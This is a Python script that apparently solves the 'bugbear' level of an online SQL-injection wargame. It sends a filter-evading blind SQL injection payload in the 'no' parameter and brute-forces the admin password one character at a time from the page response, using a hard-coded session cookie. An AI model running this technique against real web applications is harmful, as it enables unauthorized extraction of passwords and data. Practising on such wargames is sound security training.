import requests

password=''
for admin_len in range(8) :
    for admin_pass in range(47,126) :
        URL='http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?'
        query={'pw': '1','no':'1||right(left(pw,'+str(admin_len+1)+'),1)<\"'+chr(admin_pass)+'\"--'}
        headers = {'Content-Type': 'application/json; charset=utf-8'}
        cookies = {'PHPSESSID': 'ean08as37ebof2v307j3kurer3'}
        res=requests.get(URL, params=query, headers=headers, cookies=cookies)
        if("Hello admin" in res.text):
            print(chr(admin_pass-1))
            break
    print("one cycle complete")